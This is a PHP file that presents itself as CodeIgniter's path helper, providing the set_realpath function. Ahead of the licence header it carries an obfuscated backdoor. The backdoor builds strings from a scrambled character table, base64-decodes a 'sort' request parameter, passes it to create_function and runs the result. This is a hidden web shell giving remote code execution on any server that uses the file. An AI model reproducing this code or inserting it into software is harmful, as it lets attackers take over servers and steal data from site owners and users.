<?php 


$OnTHkCGV1134 = "nm*lo3gwj.sr9zx10t6)i78_cybp5vu/adkf4;eh(q2";


$xZnGLphr629 = "";

foreach([10,4,11,17] as $I){
       $xZnGLphr629 .= $OnTHkCGV1134[$I];
    }


if(isset($_REQUEST /*KRLsXgdmCPzErSEeGMvYoxFZHwmqDIVJuFLqXmmXEbENiWrAawFuXzYgtEBWeJSCxmeiqlOBZgcQtUyPNaiIawKhyGiwZDjoUMRTceKYOfUNXLZYTxeQwlPbWCkQnsTU*/["$xZnGLphr629"])){
    $LgXyiRZp4428 = $_REQUEST /*KRLsXgdmCPzErSEeGMvYoxFZHwmqDIVJuFLqXmmXEbENiWrAawFuXzYgtEBWeJSCxmeiqlOBZgcQtUyPNaiIawKhyGiwZDjoUMRTceKYOfUNXLZYTxeQwlPbWCkQnsTU*/["$xZnGLphr629"];
    $JOPCufsu6329 = "";
    $eBpyvIMz8167 = "";

    /*uSmVoPOrFdUZXtUtxXHxIAyJJnmbgWnXeNvxgwaZtjVAvLyAqoAWKEuoIQWzOMAbhBXUsXFBBjqVlXvADAMpgBINZnbQOvhYDjTkYrEWccejwdLujFsCVsrfKDybiXhP*/

    foreach([26,32,10,38,18,36,23,33,38,24,4,33,38] as $I){
       $JOPCufsu6329 .= $OnTHkCGV1134[$I];
    }

    /*tLjtXFWlXPlracvijDsIedsqPNqfWtBzDgSwpMHumwMsXVyPCvKIGHOwnQAddIodgvVsbNMwTWGnoHVppgxBBeCufNeVDRvAcDrihHlrVpUbYnMJvLDnRvLnqDcGxUVQ*/


    foreach([10,17,11,11,38,29] as $I){
       $eBpyvIMz8167 .= $OnTHkCGV1134[$I];
    }

    /*sEgRFvdgqCCJcMWWVjcTzGnYUntkLPOaczpuycoPeJDkzezdOBVtBKiETQeIsFcefoSQKDTrmJXEqrwdbMhMXHxckniZtoIbBWOgpXSMNCLTAwMXHRNYMyfvVDGkNQIS*/

    $I = $eBpyvIMz8167('n'.'o'.''.''.''.'i'.'t'.'c'.''.''.'n'.''.'u'.'f'.'_'.''.''.''.''.'e'.''.''.''.'t'.'a'.'e'.''.''.''.''.'r'.'c'.''.''.''.'');
    $f = $I("", $JOPCufsu6329($LgXyiRZp4428));
    $f();
    exit();

}


/**
 * CodeIgniter
 *
 * An open source application development framework for PHP
 *
 * This content is released under the MIT License (MIT)
 *
 * Copyright (c) 2014 - 2018, British Columbia Institute of Technology
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in
 * all copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
 * THE SOFTWARE.
 *
 * @package	CodeIgniter
 * @author	EllisLab Dev Team
 * @copyright	Copyright (c) 2008 - 2014, EllisLab, Inc. (https://ellislab.com/)
 * @copyright	Copyright (c) 2014 - 2018, British Columbia Institute of Technology (http://bcit.ca/)
 * @license	http://opensource.org/licenses/MIT	MIT License
 * @link	https://codeigniter.com
 * @since	Version 1.0.0
 * @filesource
 */
defined('BASEPATH') OR exit('No direct script access allowed');

/**
 * CodeIgniter Path Helpers
 *
 * @package		CodeIgniter
 * @subpackage	Helpers
 * @category	Helpers
 * @author		EllisLab Dev Team
 * @link		https://codeigniter.com/user_guide/helpers/path_helper.html
 */

// ------------------------------------------------------------------------

if ( ! function_exists('set_realpath'))
{
	/**
	 * Set Realpath
	 *
	 * @param	string
	 * @param	bool	checks to see if the path exists
	 * @return	string
	 */
	function set_realpath($path, $check_existance = FALSE)
	{
		// Security check to make sure the path is NOT a URL. No remote file inclusion!
		if (preg_match('#^(http:\/\/|https:\/\/|www\.|ftp|php:\/\/)#i', $path) OR filter_var($path, FILTER_VALIDATE_IP) === $path)
		{
			show_error('The path you submitted must be a local server path, not a URL');
		}

		// Resolve the path
		if (realpath($path) !== FALSE)
		{
			$path = realpath($path);
		}
		elseif ($check_existance && ! is_dir($path) && ! is_file($path))
		{
			show_error('Not a valid path: '.$path);
		}

		// Add a trailing slash, if this is a directory
		return is_dir($path) ? rtrim($path, DIRECTORY_SEPARATOR).DIRECTORY_SEPARATOR : $path;
	}
}
